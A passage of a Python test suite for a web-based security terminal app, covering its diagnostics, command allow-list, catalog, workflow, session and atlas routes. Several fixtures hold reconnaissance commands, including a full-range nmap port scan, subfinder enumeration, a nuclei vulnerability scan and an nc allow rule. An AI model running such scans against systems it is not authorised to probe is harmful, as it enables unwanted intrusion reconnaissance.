        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "audit_export_max_rows": 1,
        }):
            resp = client.get(f"/diag/audit/export?format=json&correlation_id={correlation_id}")
        payload = resp.get_json()
        assert resp.status_code == 200
        assert "application/json" in resp.content_type
        assert "attachment" in resp.headers["Content-Disposition"]
        assert "audit-events.json" in resp.headers["Content-Disposition"]
        assert [event["target_id"] for event in payload["events"]] == [newest_target_id]
        assert payload["limit"] == 1
        assert payload["truncated"] is True
        assert payload["truncation_hint"] == (
            "Export capped at 1 rows. Narrow the filters to include older matching rows."
        )

    def test_html_response_contains_expected_content(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "app_name": "diag test shell",
        }):
            resp = client.get("/diag")
        body = resp.get_data(as_text=True)
        assert "diag test shell" in body
        assert "operator diagnostics" in body
        assert 'class="btn btn-secondary btn-compact diag-back-btn"' in body
        assert 'href="/"' in body
        assert 'href="/diag/audit"' in body
        assert "back to shell" in body
        assert "<!DOCTYPE html>" in body or "<html" in body.lower()

    def test_top_command_cells_are_keyboard_expandable(self):
        """Top Commands cells render as accessible toggle buttons (tabindex=0,
        role=button, aria-expanded=false) with a delegated tap handler so
        an operator on mobile can read the full command without `title=`
        hover affordances."""
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/diag").get_data(as_text=True)
        if "diag-cmd-cell" not in body:
            pytest.skip("no top-command rows in the dev DB to assert against")
        assert (
            'class="diag-cmd-cell" tabindex="0" role="button" aria-expanded="false"'
            in body
        ), "top-command cells must carry the expand-button accessibility attrs"
        assert "toggleCmdCell" in body, "tap-to-expand handler missing from page script"

    def test_top_command_cells_render_full_untruncated_command(self):
        """The 48-char server-side `truncate` is gone — full text reaches
        the DOM so the JS expand handler can show it."""
        long_command = (
            "nmap -sT -p 1-65535 -T4 --max-retries 5 --host-timeout 30m "
            "-oA /workspace/scan-output ip.darklab.sh"
        )
        assert len(long_command) > 48, "fixture must exceed the old truncate length"
        from core.database import db_connect
        run_id = f"diag-long-cmd-{uuid.uuid4().hex}"
        started = "2000-01-01 00:00:00"
        finished = "2099-01-01 00:00:00"
        try:
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started, finished, exit_code) "
                    "VALUES (?, ?, ?, ?, ?, ?)",
                    (run_id, "diag-test", long_command, started, finished, 0),
                )
                conn.commit()
            client = self._allowed_client()
            with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
                body = client.get("/diag").get_data(as_text=True)
            # Full command appears at least twice: in `title=` and as cell text.
            # If the old truncate were still in play we would only see it in title.
            assert body.count(long_command) >= 2, (
                "full command should appear in both title and cell text"
            )
            assert "…" not in body or long_command in body
        finally:
            with db_connect() as conn:
                conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
                conn.commit()

    def test_html_response_carries_live_indicator_and_no_refresh_toggle(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/diag").get_data(as_text=True)
        assert "diag-live-indicator" in body
        assert "Refreshed at" in body
        assert "Generated at" not in body
        assert "diag-refresh-checkbox" not in body
        assert "Auto-refresh" not in body

    def test_html_response_renders_zero_custom_redaction_rule_count_as_numeric_zero(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "share_redaction_enabled": True,
            "share_redaction_rules": [],
        }):
            body = client.get("/diag").get_data(as_text=True)
        assert "custom_redaction_rule_count" in body
        assert ">0<" in body

    def test_json_format_param_returns_json(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            resp = client.get("/diag?format=json")
        assert "application/json" in resp.content_type
        data = json.loads(resp.data)
        assert "app" in data


# ── /allowed-commands ─────────────────────────────────────────────────────────

class TestAllowedCommandsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/allowed-commands")
        assert resp.status_code == 200

    def test_response_has_restricted_key(self):
        client = get_client()
        data = json.loads(client.get("/allowed-commands").data)
        assert "restricted" in data

    def test_unrestricted_when_no_file(self):
        client = get_client()
        with mock.patch("blueprints.content.load_commands_registry", return_value={"commands": [], "pipe_helpers": []}):
            data = json.loads(client.get("/allowed-commands").data)
        assert data["restricted"] is False

    def test_restricted_when_file_present(self):
        client = get_client()
        with mock.patch("blueprints.content.load_commands_registry", return_value={
            "commands": [
                {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
                {"root": "nmap", "category": "Scanning", "policy": {"allow": ["nmap"], "deny": []}},
            ],
            "pipe_helpers": [],
        }):
            data = json.loads(client.get("/allowed-commands").data)
        assert data["restricted"] is True
        assert "ping" in data["commands"]

    def test_returns_grouped_commands_when_restricted(self):
        client = get_client()
        groups = [{"name": "Networking", "commands": ["ping", "traceroute"]}]
        with mock.patch("blueprints.content.load_commands_registry", return_value={
            "commands": [
                {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
                {
                    "root": "traceroute",
                    "category": "Networking",
                    "policy": {"allow": ["traceroute"], "deny": []},
                },
            ],
            "pipe_helpers": [],
        }):
            data = json.loads(client.get("/allowed-commands").data)
        assert data["restricted"] is True
        assert data["groups"] == groups

    def test_returns_root_commands_for_prefixed_policy_entries(self):
        client = get_client()
        with mock.patch("blueprints.content.load_commands_registry", return_value={
            "commands": [
                {"root": "nc", "category": "Networking", "policy": {"allow": ["nc -z"], "deny": []}},
                {
                    "root": "openssl",
                    "category": "TLS",
                    "policy": {"allow": ["openssl s_client", "openssl ciphers"], "deny": []},
                },
            ],
            "pipe_helpers": [],
        }):
            data = json.loads(client.get("/allowed-commands").data)

        assert data["commands"] == ["nc", "openssl"]
        assert data["groups"] == [
            {"name": "Networking", "commands": ["nc"]},
            {"name": "TLS", "commands": ["openssl"]},
        ]


class TestCommandCatalogRoute:
    def test_returns_catalog_entry_for_allowed_command(self):
        client = get_client()
        registry = {
            "commands": [
                {
                    "root": "sentinel",
                    "category": "Registry Group",
                    "description": "Inspect a target.",
                    "policy": {"allow": ["sentinel"]},
                    "requires_secrets": [{"env": "SHODAN_API_KEY", "optional": False}],
                    "autocomplete": {
                        "examples": [{"value": "sentinel darklab.sh"}],
                        "flags": [{"value": "--json", "description": "Emit JSON"}],
                    },
                },
                {
                    "root": "workspace-tool",
                    "category": "Registry Group",
                    "description": "Requires workspace.",
                    "policy": {"allow": ["workspace-tool"]},
                    "feature_required": "workspace",
                },
            ],
            "pipe_helpers": [],
        }
        with mock.patch("services.commands.registry.load_commands_registry", return_value=registry), \
             mock.patch.dict("config.CFG", {"workspace_enabled": False}):
            index_resp = client.get("/commands/catalog")
            resp = client.get("/commands/catalog/sentinel")
            disabled_resp = client.get("/commands/catalog/workspace-tool")

        assert index_resp.status_code == 200
        index_data = json.loads(index_resp.data)
        assert index_data["commands"] == [{
            "root": "sentinel",
            "category": "Registry Group",
            "description": "Inspect a target.",
            "requires_secrets": [{"env": "SHODAN_API_KEY", "optional": False}],
            "example_count": 1,
            "subcommand_count": 0,
            "flag_count": 1,
        }]
        assert "workspace-tool" not in {item["root"] for item in index_data["commands"]}
        assert index_data["groups"][0]["name"] == "Registry Group"
        assert index_data["groups"][0]["commands"] == index_data["commands"]
        assert {
            (item["id"], tuple(item["entity_types"]), tuple(item["secret_env_names"]))
            for item in index_data["intel_providers"]
        } >= {
            ("virustotal", ("domain", "hash"), ("VT_API_KEY", "VTCLI_APIKEY")),
            ("ipinfo", ("ip",), ("IPINFO_TOKEN",)),
            ("teamcymru", ("ip",), ()),
            ("nvd", ("cve",), ()),
            ("chaos", ("domain",), ("PDCP_API_KEY",)),
        }
        assert {
            (item["consumer"], item["env"], tuple(item.get("fallback_envs") or []))
            for item in index_data["secret_consumers"]
        } == {
            ("sentinel", "SHODAN_API_KEY", ()),
            ("intel Shodan", "SHODAN_API_KEY", ()),
            ("intel Censys", "CENSYS_PAT", ()),
            ("intel Censys organization", "CENSYS_ORGANIZATION_ID", ()),
            ("intel VirusTotal", "VT_API_KEY", ("VTCLI_APIKEY",)),
            ("intel GreyNoise", "GREYNOISE_API_KEY", ()),
            ("intel AlienVault OTX", "OTX_API_KEY", ()),
            ("intel AbuseIPDB", "ABUSEIPDB_API_KEY", ()),
            ("intel IPinfo", "IPINFO_TOKEN", ()),
            ("intel URLhaus", "URLHAUS_AUTH_KEY", ()),
            ("intel Vulners", "VULNERS_API_KEY", ()),
            ("intel urlscan.io", "URLSCAN_API_KEY", ()),
            ("intel ThreatFox", "THREATFOX_AUTH_KEY", ()),
            ("intel SecurityTrails", "SECURITYTRAILS_API_KEY", ()),
            ("intel FOFA", "FOFA_KEY", ("FOFA_API_KEY", "FOFA_APIKEY", "FOFA_TOKEN")),
            ("intel FOFA", "FOFA_EMAIL", ()),
            ("intel ZoomEye", "ZOOMEYE_API_KEY", ()),
        }
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["root"] == "sentinel"
        assert data["description"] == "Inspect a target."
        assert data["requires_secrets"] == [{"env": "SHODAN_API_KEY", "optional": False}]
        assert data["examples"][0]["value"] == "sentinel darklab.sh"
        assert data["flags"][0]["value"] == "--json"
        assert disabled_resp.status_code == 404

    def test_returns_404_for_unknown_command(self):
        client = get_client()
        with mock.patch("services.commands.registry.load_commands_registry", return_value={"commands": [], "pipe_helpers": []}):
            resp = client.get("/commands/catalog/nope")

        assert resp.status_code == 404
        assert json.loads(resp.data)["error"] == "Command not found"


class TestAutocompleteWorkspaceRoute:
    def test_workspace_roots_follow_workspace_config(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"workspace_enabled": False}):
            disabled = json.loads(client.get("/autocomplete").data)
        with mock.patch.dict("config.CFG", {"workspace_enabled": True}):
            enabled = json.loads(client.get("/autocomplete").data)

        disabled_roots = set(disabled["builtin_command_roots"])
        enabled_roots = set(enabled["builtin_command_roots"])
        assert {"file", "cat", "ls", "rm"}.isdisjoint(disabled_roots)
        assert {"file", "cat", "ls", "rm"}.issubset(enabled_roots)

    def test_workspace_autocomplete_examples_follow_workspace_config(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"workspace_enabled": False}):
            disabled = json.loads(client.get("/autocomplete").data)
        with mock.patch.dict("config.CFG", {"workspace_enabled": True}):
            enabled = json.loads(client.get("/autocomplete").data)

        disabled_nmap = disabled["context"]["nmap"]
        enabled_nmap = enabled["context"]["nmap"]
        assert "nmap -sT -iL targets.txt -p 80,443 --open -oN nmap-web.txt" not in {
            item["value"] for item in disabled_nmap["examples"]
        }
        assert "-iL" not in {item["value"] for item in disabled_nmap["flags"]}
        assert "nmap -sT -iL targets.txt -p 80,443 --open -oN nmap-web.txt" in {
            item["value"] for item in enabled_nmap["examples"]
        }
        assert "-iL" in {item["value"] for item in enabled_nmap["flags"]}


# ── /faq ──────────────────────────────────────────────────────────────────────

class TestFaqRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/faq")
        assert resp.status_code == 200

    def test_items_key_present(self):
        client = get_client()
        data = json.loads(client.get("/faq").data)
        assert "items" in data
        assert isinstance(data["items"], list)

    def test_includes_builtin_faq_entries(self):
        client = get_client()
        data = json.loads(client.get("/faq").data)
        questions = [item.get("question") for item in data["items"]]
        assert "What is this?" in questions
        assert "What commands are allowed?" in questions


# ── /workflows ────────────────────────────────────────────────────────────────

class TestWorkflowsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/workflows")
        assert resp.status_code == 200

    def test_includes_v15_recon_playbooks(self):
        client = get_client()
        data = json.loads(client.get("/workflows").data)
        titles = {item.get("title") for item in data["items"]}
        expected = {
            "Domain OSINT / Passive Recon",
            "Subdomain Enumeration & Validation",
            "Web Directory Discovery",
            "SSL / TLS Deep Dive",
            "CDN / Edge Behavior Check",
            "API Recon",
            "Network Path Analysis",
            "Fast Port Discovery to Service Fingerprint",
        }
        assert expected.issubset(titles)

    def test_payload_steps_are_prompt_fillable(self):
        client = get_client()
        data = json.loads(client.get("/workflows").data)
        assert data["items"], "workflow payload should not be empty"
        for item in data["items"]:
            assert isinstance(item.get("title"), str) and item["title"]
            assert isinstance(item.get("description"), str)
            assert isinstance(item.get("inputs"), list)
            assert isinstance(item.get("steps"), list) and item["steps"]
            for workflow_input in item["inputs"]:
                assert isinstance(workflow_input.get("id"), str) and workflow_input["id"].strip()
                assert isinstance(workflow_input.get("label"), str) and workflow_input["label"].strip()
                assert workflow_input.get("type") in {"domain", "host", "url", "port", "path"}
                assert isinstance(workflow_input.get("required"), bool)
                assert isinstance(workflow_input.get("placeholder"), str)
                assert isinstance(workflow_input.get("default"), str)
                assert isinstance(workflow_input.get("help"), str)
            for step in item["steps"]:
                assert isinstance(step.get("cmd"), str) and step["cmd"].strip()
                assert isinstance(step.get("note"), str)

    def test_payload_includes_input_driven_workflows(self):
        client = get_client()
        data = json.loads(client.get("/workflows").data)
        by_title = {item["title"]: item for item in data["items"]}
        dns = by_title["DNS Troubleshooting"]
        assert dns["inputs"] == [
            {
                "id": "domain",
                "label": "Domain",
                "type": "domain",
                "required": True,
                "placeholder": "example.com",
                "default": "darklab.sh",
                "help": "",
            }
        ]
        assert dns["steps"][0]["cmd"] == "dig {{domain}} A"

    def test_workspace_required_workflows_follow_files_feature_flag(self):
        client = get_client()
        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": False}):
            disabled = json.loads(client.get("/workflows").data)
        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": True}):
            enabled = json.loads(client.get("/workflows").data)

        disabled_titles = {item["title"] for item in disabled["items"]}
        enabled_by_title = {item["title"]: item for item in enabled["items"]}

        assert "Subdomain HTTP Triage" not in disabled_titles
        assert "Crawl And Scan" not in disabled_titles
        assert enabled_by_title["Subdomain HTTP Triage"]["steps"][0]["cmd"] == (
            "subfinder -d {{domain}} -silent -o subdomains.txt"
        )
        assert enabled_by_title["Crawl And Scan"]["steps"][2]["cmd"] == (
            "nuclei -l crawled-urls.txt -severity high,critical -o nuclei-findings.txt"
        )

    def test_user_workflows_are_returned_before_builtins(self):
        client = get_client()
        session_id = "workflow-route-" + __import__("uuid").uuid4().hex[:8]
        resp = client.post(
            "/session/workflows",
            headers={"X-Session-ID": session_id},
            json={
                "title": "Saved DNS",
                "description": "custom sequence",
                "inputs": [
                    {
                        "id": "domain",
                        "label": "Domain",
                        "type": "domain",
                        "required": True,
                        "placeholder": "example.com",
                        "default": "",
                        "help": "",
                    },
                ],
                "steps": [{"cmd": "dig {{domain}} A", "note": "resolve apex"}],
            },
        )
        assert resp.status_code == 201

        data = json.loads(client.get("/workflows", headers={"X-Session-ID": session_id}).data)

        assert data["items"][0]["title"] == "Saved DNS"
        assert data["items"][0]["source"] == "user"
        assert data["items"][1]["source"] == "builtin"


# ── /session/preferences ─────────────────────────────────────────────────────

class TestSessionPreferencesRoute:
    def test_tour_seen_version_round_trips_unset_current_and_stale_values(self):
        client = get_client()
        session = "tour-pref-" + uuid.uuid4().hex[:8]
        try:
            empty = json.loads(client.get(
                "/session/preferences",
                headers={"X-Session-ID": session},
            ).data)
            assert empty["preferences"] == {}

            current_resp = client.post(
                "/session/preferences",
                headers={"X-Session-ID": session},
                json={"preferences": {"pref_tour_seen_version": 3}},
            )
            assert current_resp.status_code == 200
            current = json.loads(current_resp.data)
            assert current["preferences"]["pref_tour_seen_version"] == 3

            stale_resp = client.post(
                "/session/preferences",
                headers={"X-Session-ID": session},
                json={"preferences": {"pref_tour_seen_version": 1}},
            )
            assert stale_resp.status_code == 200
            stale = json.loads(stale_resp.data)
            assert stale["preferences"]["pref_tour_seen_version"] == 1

            loaded = json.loads(client.get(
                "/session/preferences",
                headers={"X-Session-ID": session},
            ).data)
            assert loaded["preferences"]["pref_tour_seen_version"] == 1
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM session_preferences WHERE session_id = ?", (session,))
                conn.commit()

    def test_tour_seen_route_records_current_tour_version_without_losing_preferences(self):
        client = get_client()
        session = "tour-seen-" + uuid.uuid4().hex[:8]
        try:
            client.post(
                "/session/preferences",
                headers={"X-Session-ID": session},
                json={"preferences": {"pref_compare_context": "10"}},
            )
            with mock.patch(
                "blueprints.session.load_tour",
                return_value={"version": 4, "chapters": [{"id": "intro"}]},
            ):
                resp = client.post("/session/tour-seen", headers={"X-Session-ID": session})
            assert resp.status_code == 200
            data = json.loads(resp.data)
            assert data["tour_version"] == 4
            assert data["preferences"]["pref_tour_seen_version"] == 4
            assert data["preferences"]["pref_compare_context"] == "10"
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute("DELETE FROM session_preferences WHERE session_id = ?", (session,))
                conn.commit()

    def test_tour_seen_version_migrates_with_session_token(self):
        client = get_client()
        from_session = "anon-tour-" + uuid.uuid4().hex[:8]
        token = "tok_" + uuid.uuid4().hex
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO session_tokens (token, created) VALUES (?, datetime('now'))",
                    (token,),
                )
                conn.execute(
                    "INSERT INTO session_preferences (session_id, preferences, updated) "
                    "VALUES (?, ?, datetime('now'))",
                    (from_session, json.dumps({"pref_tour_seen_version": 5})),
                )
                conn.commit()

            resp = client.post(
                "/session/migrate",
                headers={"X-Session-ID": from_session},
                json={"from_session_id": from_session, "to_session_id": token},
            )
            assert resp.status_code == 200
            data = json.loads(resp.data)
            assert data["migrated_preferences"] == 1

            prefs = json.loads(client.get(
                "/session/preferences",
                headers={"X-Session-ID": token},
            ).data)
            assert prefs["preferences"]["pref_tour_seen_version"] == 5
        finally:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "DELETE FROM session_preferences WHERE session_id IN (?, ?)",
                    (from_session, token),
                )
                conn.execute("DELETE FROM session_tokens WHERE token = ?", (token,))
                conn.commit()


# ── /shortcuts ────────────────────────────────────────────────────────────────

class TestShortcutsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/shortcuts")
        assert resp.status_code == 200

    def test_payload_shape(self):
        client = get_client()
        data = json.loads(client.get("/shortcuts").data)
        assert isinstance(data.get("sections"), list)
        assert data["sections"], "shortcuts payload should not be empty"
        for section in data["sections"]:
            assert isinstance(section, dict)
            assert isinstance(section.get("title"), str) and section["title"]
            assert isinstance(section.get("items"), list) and section["items"]
            for item in section["items"]:
                assert isinstance(item, dict)
                assert "key" in item and "description" in item
        assert isinstance(data.get("note", ""), str)

    def test_sections_cover_terminal_tabs_and_ui(self):
        client = get_client()
        data = json.loads(client.get("/shortcuts").data)
        titles = [section.get("title") for section in data["sections"]]
        assert titles == ["Terminal", "Tabs", "UI"]

    def test_includes_question_mark_self_reference(self):
        client = get_client()
        data = json.loads(client.get("/shortcuts").data)
        keys = [item.get("key") for section in data["sections"] for item in section["items"]]
        assert "?" in keys, "shortcuts overlay trigger should be self-documenting"

    def test_matches_shortcuts_builtin_source(self):
        from services.commands.builtins import get_current_shortcuts
        direct = get_current_shortcuts(is_mac=False)
        client = get_client()
        data = json.loads(client.get("/shortcuts").data)
        assert data["sections"] == direct["sections"]

    def test_non_mac_user_agent_renders_alt_prefix(self):
        client = get_client()
        client.environ_base["HTTP_USER_AGENT"] = (
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        data = json.loads(client.get("/shortcuts").data)
        keys = [item["key"] for section in data["sections"] for item in section["items"]]
        assert "Alt+T" in keys
        assert "Alt+C" in keys
        assert "Alt+P" in keys
        assert "Alt+Shift+P" in keys
        assert "Alt+Shift+C" in keys
        assert not any(key.startswith("Option+") for key in keys)

    def test_mac_user_agent_renders_option_prefix(self):
        client = get_client()
        client.environ_base["HTTP_USER_AGENT"] = (
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
        )
        data = json.loads(client.get("/shortcuts").data)
        keys = [item["key"] for section in data["sections"] for item in section["items"]]
        assert "Option+T" in keys
        assert "Option+C" in keys
        assert "Option+P" in keys
        assert "Option+Shift+P" in keys
        assert "Option+Shift+C" in keys
        assert not any(key.startswith("Alt+") for key in keys)


# ── /welcome/ascii ───────────────────────────────────────────────────────────

class TestWelcomeAsciiRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/ascii")
        assert resp.status_code == 200

    def test_contains_banner_art(self):
        client = get_client()
        resp = client.get("/welcome/ascii")
        assert b"/$$" in resp.data


class TestWelcomeAsciiMobileRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/ascii-mobile")
        assert resp.status_code == 200

    def test_returns_plain_text_banner(self):
        client = get_client()
        resp = client.get("/welcome/ascii-mobile")
        assert resp.mimetype == "text/plain"
        assert resp.data


# ── /welcome/hints ───────────────────────────────────────────────────────────

class TestWelcomeHintsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/hints")
        assert resp.status_code == 200

    def test_items_key_present(self):
        client = get_client()
        data = json.loads(client.get("/welcome/hints").data)
        assert "items" in data
        assert isinstance(data["items"], list)


class TestMobileWelcomeHintsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/welcome/hints-mobile")
        assert resp.status_code == 200

    def test_items_key_present(self):
        client = get_client()
        data = json.loads(client.get("/welcome/hints-mobile").data)
        assert "items" in data
        assert isinstance(data["items"], list)


# ── /atlas ───────────────────────────────────────────────────────────────────

class TestAtlasRoutes:
    def _session_id(self):
        return "atlas-" + uuid.uuid4().hex[:8]

    def _seed_entity_run(self, session_id):
        run_id = "run-" + uuid.uuid4().hex
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'external', ?, ?, ?, 1)",
                (run_id, session_id, "nmap darklab.sh", "2026-05-14T00:00:00+00:00", "[]"),
            )
            recorded = materialize_run_entities(
                conn,
                session_id,
                run_id,
                [{
                    "text": "darklab.sh CVE-2025-49113",
                    "entities": [
                        {"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"},
                        {"type": "cve", "value": "CVE-2025-49113", "canonical_value": "CVE-2025-49113"},
                    ],
                }],
                seen_at="2026-05-14T00:00:01+00:00",
            )
            record_run_findings(conn, session_id, run_id, [{
                "text": "443/tcp open https on darklab.sh",
                "signals": ["findings"],
                "line_index": 0,
                "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
            }])
            conn.commit()
        return run_id, recorded

    def _seed_domain_finding_run(self, session_id, domain):
        run_id = "run-" + uuid.uuid4().hex
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'external', ?, ?, ?, 1)",
                (run_id, session_id, f"nmap {domain}", "2026-05-14T00:00:00+00:00", "[]"),
            )
            recorded = materialize_run_entities(
                conn,
                session_id,
                run_id,
                [{
                    "text": domain,
                    "entities": [{"type": "domain", "value": domain, "canonical_value": domain}],
                }],
                seen_at="2026-05-14T00:00:01+00:00",
            )
            record_run_findings(conn, session_id, run_id, [{
                "text": f"443/tcp open https on {domain}",
                "signals": ["findings"],
                "line_index": 0,
                "entities": [{"type": "domain", "value": domain, "canonical_value": domain}],
            }])
            conn.commit()
        return run_id, recorded

    def test_lists_session_entities_and_detail(self):
        client = get_client()
        session_id = self._session_id()
        run_id, recorded = self._seed_entity_run(session_id)
        domain_id = next(item["id"] for item in recorded if item["type"] == "domain")

        summary_resp = client.get("/atlas", headers={"X-Session-ID": session_id})
        list_resp = client.get("/atlas/entities?type=domain", headers={"X-Session-ID": session_id})
        detail_resp = client.get(f"/atlas/entities/{domain_id}", headers={"X-Session-ID": session_id})

        assert summary_resp.status_code == 200
        assert json.loads(summary_resp.data)["counts"]["domain"] == 1
        assert json.loads(summary_resp.data)["findings"] == 1
        assert list_resp.status_code == 200
        data = json.loads(list_resp.data)
        assert data["total"] == 1
        assert data["entities"][0]["id"] == domain_id
        assert data["entities"][0]["canonical_value"] == "darklab.sh"
        assert detail_resp.status_code == 200
        detail = json.loads(detail_resp.data)
        assert detail["entity"]["id"] == domain_id
        assert detail["runs"][0]["run_id"] == run_id
        assert detail["findings"][0]["raw_line"] == "443/tcp open https on darklab.sh"

    def test_findings_list_can_filter_by_source_run(self):
        client = get_client()
        session_id = self._session_id()
        first_run_id, _ = self._seed_domain_finding_run(session_id, "alpha.darklab.sh")
        second_run_id, _ = self._seed_domain_finding_run(session_id, "beta.darklab.sh")
        unrelated_run_id = "run-" + uuid.uuid4().hex
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, 'external', 'echo no atlas rows', ?, ?, 1)",
                (unrelated_run_id, session_id, "2026-05-14T00:00:00+00:00", "[]"),
            )
            conn.commit()
        other_session_run_id, _ = self._seed_domain_finding_run(self._session_id(), "other.darklab.sh")

        all_resp = client.get("/atlas/findings", headers={"X-Session-ID": session_id})
        summary_resp = client.get(f"/atlas?run_id={quote(first_run_id)}", headers={"X-Session-ID": session_id})
        entity_resp = client.get(
            f"/atlas/entities?type=domain&run_id={quote(first_run_id)}",
            headers={"X-Session-ID": session_id},
        )
        first_resp = client.get(
            f"/atlas/findings?run_id={quote(first_run_id)}",
            headers={"X-Session-ID": session_id},
        )
        second_resp = client.get(
            f"/atlas/findings?run_id={quote(second_run_id)}",
            headers={"X-Session-ID": session_id},
        )
        other_resp = client.get(
            f"/atlas/findings?run_id={quote(other_session_run_id)}",
            headers={"X-Session-ID": session_id},
        )
        runs_resp = client.get("/atlas/runs", headers={"X-Session-ID": session_id})
        searched_runs_resp = client.get("/atlas/runs?q=beta", headers={"X-Session-ID": session_id})

        assert all_resp.status_code == 200
        assert summary_resp.status_code == 200
        assert entity_resp.status_code == 200
        assert first_resp.status_code == 200
        assert second_resp.status_code == 200
        assert other_resp.status_code == 200
        assert runs_resp.status_code == 200
        assert searched_runs_resp.status_code == 200
        assert json.loads(all_resp.data)["total"] == 2
        assert json.loads(summary_resp.data)["counts"]["domain"] == 1
        assert json.loads(summary_resp.data)["findings"] == 1
        entity_data = json.loads(entity_resp.data)
        assert entity_data["total"] == 1
        assert entity_data["entities"][0]["canonical_value"] == "alpha.darklab.sh"
        first_data = json.loads(first_resp.data)
        second_data = json.loads(second_resp.data)
        assert first_data["total"] == 1
        assert first_data["findings"][0]["raw_line"] == "443/tcp open https on alpha.darklab.sh"
        assert second_data["total"] == 1
        assert second_data["findings"][0]["raw_line"] == "443/tcp open https on beta.darklab.sh"
        assert json.loads(other_resp.data)["total"] == 0
        run_options = json.loads(runs_resp.data)["runs"]
        assert {item["id"] for item in run_options} == {first_run_id, second_run_id}
        assert unrelated_run_id not in {item["id"] for item in run_options}
        assert run_options[0]["entity_count"] == 1
        assert run_options[0]["finding_count"] == 1
        searched_run_options = json.loads(searched_runs_resp.data)["runs"]
        assert [item["id"] for item in searched_run_options] == [second_run_id]

    def test_summary_can_filter_by_project(self):
        client = get_client()
        session_id = self._session_id()
        _, alpha_recorded = self._seed_domain_finding_run(session_id, "alpha.darklab.sh")
        _, beta_recorded = self._seed_domain_finding_run(session_id, "beta.darklab.sh")
        alpha_entity_id = next(item["id"] for item in alpha_recorded if item["type"] == "domain")
        beta_entity_id = next(item["id"] for item in beta_recorded if item["type"] == "domain")
        project_id = "prj-" + uuid.uuid4().hex
        other_project_id = "prj-" + uuid.uuid4().hex
        timestamp = "2026-05-14T00:00:03+00:00"
        with db_connect() as conn:
            for current_project_id, slug in (
                (project_id, "atlas-summary-" + uuid.uuid4().hex[:8]),
                (other_project_id, "atlas-summary-" + uuid.uuid4().hex[:8]),
            ):
                conn.execute(
                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
                    "VALUES (?, ?, 'Atlas Project', ?, ?, ?)",
                    (current_project_id, session_id, slug, timestamp, timestamp),
                )
            for current_project_id, entity_id in (
                (project_id, alpha_entity_id),
                (other_project_id, beta_entity_id),
            ):
                conn.execute(
                    "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                    "VALUES (?, ?, 'atlas_entity', ?, 'manual', ?)",
                    ("plink-" + uuid.uuid4().hex, current_project_id, entity_id, timestamp),
                )
            conn.commit()

        all_resp = client.get("/atlas", headers={"X-Session-ID": session_id})
        project_resp = client.get(f"/atlas?project_id={quote(project_id)}", headers={"X-Session-ID": session_id})

        assert all_resp.status_code == 200
        assert project_resp.status_code == 200
        assert json.loads(all_resp.data)["counts"]["domain"] == 2
        assert json.loads(all_resp.data)["findings"] == 2
        project_data = json.loads(project_resp.data)
        assert project_data["counts"]["domain"] == 1
        assert project_data["findings"] == 1

    def test_entity_list_batches_metadata_for_current_page(self):
        from services.atlas.lookup import list_entities

        session_id = self._session_id()
        _, recorded = self._seed_entity_run(session_id)
        project_id = "prj-" + uuid.uuid4().hex
        timestamp = "2026-05-14T00:00:03+00:00"
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO projects (id, session_id, name, slug, created, updated) "
                "VALUES (?, ?, 'Atlas Project', ?, ?, ?)",
                (project_id, session_id, "atlas-project-" + uuid.uuid4().hex[:8], timestamp, timestamp),
            )
            for index, entity in enumerate(recorded):
                entity_id = entity["id"]
                conn.execute(
                    "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
